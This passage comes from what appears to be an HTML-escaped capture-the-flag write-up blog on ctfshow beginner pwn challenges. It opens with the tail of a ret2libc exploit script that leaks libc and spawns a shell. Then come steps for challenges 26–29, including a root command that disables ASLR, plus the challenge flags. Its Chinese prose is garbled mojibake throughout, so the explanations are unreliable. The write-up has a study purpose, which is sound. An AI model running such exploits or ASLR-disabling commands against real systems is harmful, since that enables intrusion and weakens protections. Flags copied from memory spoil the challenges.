&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LibcSearcher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;str_bin_sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™éƒ¨åˆ†ä¸»è¦æ¶‰åŠåˆ°æ ˆæº¢å‡ºçš„ç« èŠ‚çŸ¥è¯†ç‚¹ï¼Œæˆ‘å·²ç»è®²è§£çš„å¾ˆè¯¦ç»†å¾ˆå•°å—¦äº†ï¼Œå¦‚æœçœ‹ä¸æ‡‚å°±è·³è¿‡å§ï¼ŒæŠŠæ ˆæº¢å‡ºææ‡‚åå†è·³å›æ¥åšã€‚æˆ‘å½“æ—¶ä¹Ÿæ˜¯è·³è¿‡çš„ï¼Œä¹‹åå†å›æ¥å†™wpçš„ã€‚&lt;/p&gt;
&lt;p&gt;æ„Ÿè§‰å¼ºåº¦ä¸Šæ¥äº†ï¼Œåšå¾—æœ‰ç‚¹åƒåŠ›ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_026&#34;&gt;PWN_026
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagã€‚ä¸ºç¡®ä¿flagæ­£ç¡®ï¼Œæœ¬é¢˜å»ºè®®ç”¨æä¾›è™šæ‹Ÿæœºè¿è¡Œã€‚  &lt;a class=&#34;link&#34; href=&#34;PWN_26%5cPWN&#34; &gt;PWN&lt;/a&gt;  &lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;libc-2.27.so&lt;/a&gt; ï¼ˆæå–ç showï¼‰&lt;/p&gt;
&lt;p&gt;è¿™é¢˜å‘åˆ°æˆ‘äº†ï¼Œè¿è¡Œç¨‹åºå‘ç°ç›´æ¥çˆ†flagï¼Œäº¤ä¸Šå»å‘ç°æ˜¯å‡çš„/(ã„’oã„’)/~~&lt;/p&gt;
&lt;p&gt;IDAx64åˆ†æï¼Œæœ‰systemåé—¨å‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/70.png&#34;
	width=&#34;1195&#34;
	height=&#34;590&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/70_hu_5af04d0f0913cda9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/70_hu_4cf51b4305482ce.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;202&#34;
		data-flex-basis=&#34;486px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è€Œä¸”å¯ä»¥çŸ¥é“è¿™ä¸ªflagæ˜¯æœ‰å‡ ä¸ªprintfã€putså…±åŒæ‰“å°å‡ºçš„ã€å­—ç¬¦ä¸²ç”±åœ°å€æ‹¼æ¥ï¼ˆ%pæ‰“å°æŒ‡é’ˆæˆ–è€…åœ°å€ï¼Œä»¥16è¿›åˆ¶å½¢å¼ï¼‰è€Œæˆã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/71.png&#34;
	width=&#34;1250&#34;
	height=&#34;719&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/71_hu_e57bc28849d3c88.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/71_hu_1586fa3609ae168d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;173&#34;
		data-flex-basis=&#34;417px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ¯æ¬¡flagéƒ½ä¸ä¸€æ ·ï¼Œè¯´æ˜åœ°å€ä¸€ç›´åœ¨å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯åœ°å€éšæœºåŒ–ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Linuxä¿æŠ¤æœºåˆ¶æœ‰è®²è¿‡ASLRï¼Œå…³äº&lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/p/pwn-1/#pie%e5%92%8caslr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ASLRä¿æŠ¤å¯ä»¥çœ‹å›PWN-1&lt;/a&gt;ï¼šASLRï¼ˆAddress Space Layout Randomizationï¼‰æ˜¯ä¸€ç§æ“ä½œç³»ç»Ÿçº§åˆ«çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ—¨åœ¨å¢åŠ è½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å®ƒé€šè¿‡éšæœºåŒ–ç¨‹åºåœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼Œä½¿å¾—æ”»å‡»è€…éš¾ä»¥å‡†ç¡®åœ°ç¡®å®šå…³é”®ä»£ç å’Œæ•°æ®çš„ä½ç½®ã€‚&lt;/p&gt;
&lt;p&gt;gdbè°ƒè¯•ä¸€ä¸‹ï¼Œé¢˜ç›®æ—©ç»™å‡ºäº†2ï¼Œåœ¨è¿™é‡Œå•çº¯æ¼”ç¤ºä¸€ä¸‹ï¼›&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gdb -q pwn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/72.png&#34;
	width=&#34;1110&#34;
	height=&#34;410&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/72_hu_f7e2f4bac4aac2dd.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/72_hu_1517f77077b3d7c7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;270&#34;
		data-flex-basis=&#34;649px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell cat /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è™½ç„¶ &lt;code&gt;checksec&lt;/code&gt; è¾“å‡ºä¸­æ²¡æœ‰ç›´æ¥çš„ ASLR å¼€å¯çŠ¶æ€ï¼Œä½†å¯ä»¥ç»“åˆç³»ç»Ÿå±‚é¢çš„è®¾ç½®ï¼ˆé€šè¿‡ &lt;code&gt;cat/proc/sys/kernel/randomize_va_space&lt;/code&gt; æŸ¥çœ‹ï¼Œè¾“å‡º &lt;code&gt;0&lt;/code&gt; è¡¨ç¤ºå…³é—­ ASLRï¼Œ&lt;code&gt;1&lt;/code&gt; è¡¨ç¤ºéƒ¨åˆ†å¼€å¯ï¼Œ&lt;code&gt;2&lt;/code&gt; è¡¨ç¤ºå®Œå…¨å¼€å¯ ï¼‰æ¥åˆ¤æ–­ç¨‹åºè¿è¡Œæ—¶çš„ ASLR æƒ…å†µã€‚&lt;/p&gt;
&lt;p&gt;æ—¢ç„¶åœ°å€éšæœºåŒ–ä¿æŠ¤ï¼Œæˆ‘ä»¬å°±æŠŠå®ƒå…³æ‰ï¼ˆè®°å¾—ææƒrootï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/73.png&#34;
	width=&#34;1340&#34;
	height=&#34;774&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/73_hu_b96db4a3f2e41298.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/73_hu_5ee4a282ddb01af4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;flag&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;173&#34;
		data-flex-basis=&#34;415px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰ä¸ªç‚¹å°±æ˜¯æˆ‘çš„flagæ˜¯ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}&lt;/p&gt;
&lt;p&gt;ä½†ä¸çŸ¥ä¸ºå•¥å’Œå®˜æ–¹ä¸ä¸€æ ·flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}&lt;/p&gt;
&lt;p&gt;ä½†æˆ‘çš„ç¨‹åºè¿è¡Œäº†ä¸‰æ¬¡ï¼ŒASRLä¹Ÿå…³äº†ï¼Œflagå‡ºæ¥çš„æ˜¯ä¸€æ ·çš„ï¼Œä»£è¡¨åœ°å€æ˜¯çœŸå®çš„ï¼Œflagæ²¡é”™çš„ã€‚åæ­£å¤§ä½“æ€è·¯æ˜¯æ­£ç¡®çš„ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-tip&#34;&gt;
    &lt;p&gt;æ€»ä¹‹è®°ä½ï¼š/proc/sys/kernel/randomize_va_space&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_027&#34;&gt;PWN_027
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagã€‚&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;libc-2.27.so&lt;/a&gt;   &lt;a class=&#34;link&#34; href=&#34;PWN_027%5cPWN&#34; &gt;PWN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é¢˜ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œâ€If the result is 0 or 1, then you get the correct flag!â€œå°†ASLRä¿æŠ¤çš„æ•°å€¼æ”¹æˆ1æˆ–0å°±å¥½ã€‚ï¼ˆå¥—ä¸Šé¢˜çš„å…¬å¼ï¼‰&lt;/p&gt;
&lt;p&gt;æ€ªæ€ªçš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/74.png&#34;
	width=&#34;579&#34;
	height=&#34;161&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/74_hu_a5de9c2fc5414abb.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/74_hu_32320de88db9a594.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;359&#34;
		data-flex-basis=&#34;863px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å®˜æ–¹flagæ˜¯ctfshow{0x400687_0x400560_0x603260}&lt;/p&gt;
&lt;p&gt;æ¬¸æˆ‘å‘ç°&amp;hellip;.0x603260çš„åé¢çš„6å˜æˆaäº†ï¼Œæœ‰ç‚¹æ‹›ç¬‘&amp;hellip;åº”è¯¥æ˜¯Kaliç¯å¢ƒå’ŒUbuntuä¸åŒï¼Œæˆ‘å»ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œå‘ç°å¤§éƒ¨åˆ†PWNçš„WPéƒ½æ˜¯ç”¨Ubuntuè§£çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/75.png&#34;
	width=&#34;1203&#34;
	height=&#34;595&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/75_hu_d19abb44e81b7200.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/75_hu_da8dd3cdf4dd0a83.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Ubuntu&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;202&#34;
		data-flex-basis=&#34;485px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œçš„flagå°±æ˜¯æ­£å¸¸çš„äº†ã€‚ä»ç°åœ¨å¼€å§‹æˆ‘å°†å½»åº•ä½¿ç”¨Ubuntuäº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_028&#34;&gt;PWN_028
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagï¼›&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;libc-2.27.so&lt;/a&gt;ã€ &lt;a class=&#34;link&#34; href=&#34;PWN_028%5cPWN&#34; &gt;PWN&lt;/a&gt; ï¼ˆshowï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/76.png&#34;
	width=&#34;1081&#34;
	height=&#34;520&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/76_hu_3bb0ae8eea6f69ee.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/76_hu_bd87ab6076c16d6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é€åˆ†&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é¢˜é€åˆ†çš„ï¼ŒASLRç›´æ¥å…³çš„ï¼Œflagè¿˜æ˜¯åœ°å€æ‹¼å‡ºæ¥çš„ï¼Œé‚£flagå°±ä¸å˜å¾—å°±æ˜¯çœŸçš„äº†ã€‚ä¸ä¿¡å¯ä»¥å¤šè¿è¡Œå‡ æ¬¡ï¼Œä½ çœ‹flagä¼šå˜å—ï¼Ÿ&lt;/p&gt;
&lt;p&gt;flag is :ctfshow{0x400687_0x400560}&lt;/p&gt;
&lt;h3 id=&#34;pwn_029&#34;&gt;PWN_029
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šASLRå’ŒPIEå¼€å¯åï¼›&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;libc-2.27.so&lt;/a&gt;ã€ &lt;a class=&#34;link&#34; href=&#34;PWN_029%5cPWN&#34; &gt;PWN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¯•ç€&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#pie%e5%92%8caslr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ASLRå’ŒPIEä¿æŠ¤&lt;/a&gt;å¼€å¯åï¼Œåœ°å€éƒ½ä¼šå°†éšæœºåŒ–ï¼Œè¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºç²’åº¦é—®é¢˜ï¼Œè™½ç„¶åœ°å€éƒ½è¢«éšæœºåŒ–äº†ï¼Œä½†æ˜¯è¢«éšæœºåŒ–çš„éƒ½ä»…ä»…æ˜¯æŸä¸ªå¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œè€Œåœ¨å…¶å†…éƒ¨è¿˜æ˜¯åŸæ¥çš„ç»“æ„ï¼Œä¹Ÿå°±æ˜¯ç›¸å¯¹åç§»æ˜¯ä¸ä¼šå˜åŒ–çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/80.png&#34;
	width=&#34;1045&#34;
	height=&#34;210&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/80_hu_eb0b3f7225c19224.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/80_hu_a72e66fce323c049.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;å·²ç»å¼€äº†PIEä¿æŠ¤&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;497&#34;
		data-flex-basis=&#34;1194px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sysctl -w kernel.randomize_va_space&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#å®Œå…¨æ‰“å¼€ASLRä¿æŠ¤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ç›´æ¥è¿è¡Œ&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;flagï¼ˆæœ‰ç‚¹é•¿ä½†æ˜¯å¯¹çš„&amp;hellip;ï¼‰ï¼šctfshow{Address_Space_Layout_Randomization&amp;amp;&amp;amp;Position-Independent_Executable_1s_C0000000000l!}&lt;/p&gt;
&lt;p&gt;è¿™é¢˜åªæ˜¯è®©ä½ äº†è§£ä¸‹ASLRå’ŒPIEä¿æŠ¤çš„ç‰¹ç‚¹ï¼Œflagä¸æ˜¯ç›®çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/77.png&#34;
	width=&#34;721&#34;
	height=&#34;246&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/77_hu_786e1172cf75d668.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/77_hu_6905a90a7330f54a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;1&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;293&#34;
		data-flex-basis=&#34;703px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/78.png&#34;
	width=&#34;939&#34;
	height=&#34;306&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/78_hu_e1703259702046b2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/78_hu_f1640231a6bba9a3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;2&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;306&#34;
		data-flex-basis=&#34;736px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/79.png&#34;
	width=&#34;851&#34;
	height=&#34;331&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/79_hu_fec9c38c099bb243.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/79_hu_e3e1050063b8af4d.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;3&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;257&#34;
		data-flex-basis=&#34;617px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_030&#34;&gt;PWN_030
